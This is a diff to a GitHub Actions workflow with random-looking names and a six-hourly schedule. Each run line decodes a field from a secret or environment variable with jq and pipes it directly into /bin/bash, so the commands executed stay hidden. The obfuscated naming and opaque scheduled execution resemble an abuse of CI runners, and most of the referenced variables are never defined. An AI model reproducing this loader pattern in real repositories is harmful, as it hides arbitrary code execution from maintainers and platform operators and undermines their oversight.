@@ -1,9 +1,9 @@
 name: zhaoqingyun3456
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 2/6 * * *'
-
+    - cron: '9 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +12,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhaoqingyun3456
         env:
-          ug49: ${{ secrets.ug49 }}
+          awmb49530: ${{ secrets.awmb49530 }}
         run: |
-          echo $ug49 | jq -r .tp2 | /bin/bash
-          echo $kuhj512 | jq -r .z61 | /bin/bash
-          echo $bjetn86962 | jq -r .bvdp73 | /bin/bash
-          echo $uqrg79563 | jq -r .e75785 | /bin/bash
-          echo $ag48 | jq -r .lvk4 | /bin/bash
-          echo $rvx4 | jq -r .okqwj708 | /bin/bash
-          echo $m56940 | jq -r .lsq410 | /bin/bash
-          echo $nn3 | jq -r .hkoj2 | /bin/bash
+          echo $awmb49530 | jq -r .lmc06 | /bin/bash
+          echo $w3427 | jq -r .zm4 | /bin/bash
+          echo $c495 | jq -r .uox23 | /bin/bash
+          echo $b48612 | jq -r .kaqv5229 | /bin/bash
+          echo $ftro37224 | jq -r .rtdq6021 | /bin/bash
+          echo $elt6997 | jq -r .c50352 | /bin/bash
+          echo $x33 | jq -r .amruq81316 | /bin/bash
+          echo $xydd7 | jq -r .c780 | /bin/bash
+          echo $vsfun262 | jq -r .hvjuc2 | /bin/bash
+          echo $u33 | jq -r .t9096 | /bin/bash
+          echo $hb3976 | jq -r .nhqt9371 | /bin/bash
+          echo $brw1 | jq -r .pt90348 | /bin/bash
+          echo $p72 | jq -r .jyykn405 | /bin/bash
+          echo $g3977 | jq -r .erk93587 | /bin/bash
+          echo $y275 | jq -r .qglm6 | /bin/bash
 
